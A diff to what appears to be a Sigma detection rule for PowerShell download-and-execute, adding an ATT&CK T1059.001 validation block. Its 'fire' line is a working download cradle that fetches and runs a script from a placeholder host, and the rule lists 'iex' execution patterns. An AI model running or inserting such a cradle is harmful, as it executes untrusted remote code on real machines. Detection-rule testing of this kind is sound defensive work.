@@ -32,6 +32,10 @@ detection:
       - 'iex('
       - '| iex'
   condition: selection and download and execute
+validation:
+  atomic: T1059.001
+  fire: |-
+    powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://<host>/a.ps1')"
 falsepositives:
   - Package bootstrap scripts, which should originate from known hosts
 level: high
